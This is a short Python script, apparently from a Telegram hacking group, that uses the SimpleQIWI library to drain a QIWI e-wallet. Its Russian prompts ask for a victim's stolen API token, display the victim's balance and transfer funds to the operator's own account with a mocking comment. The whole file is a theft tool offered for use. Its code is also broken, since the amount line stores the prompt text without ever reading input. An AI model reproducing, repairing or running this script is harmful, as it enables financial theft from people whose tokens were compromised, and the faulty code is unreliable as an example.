import os
from SimpleQIWI import *
os.system("clear")
print ("Coded by t.me/Andreyoss")
print ("Group - t.me/hak_team")
print ("Chanel - t.me/termux-hub")
print ("")
print ("")
print ("")
token = input ("Введите токен жертвы: ")
phone = input ("Введите ваш телефон: ")
api = QApi(token=token, phone=phone)
print ("Баланс найден!")
print (api.balance)
account = input ("Введите ваш номер киви: ")
amount = ("Введите сумму перечисления: ")
comment = input ("Введите коментарий который прийдет после того как снимится бабло: ")
api.pay(account=account, amount=amount, comment=comment)
print (api.balance)
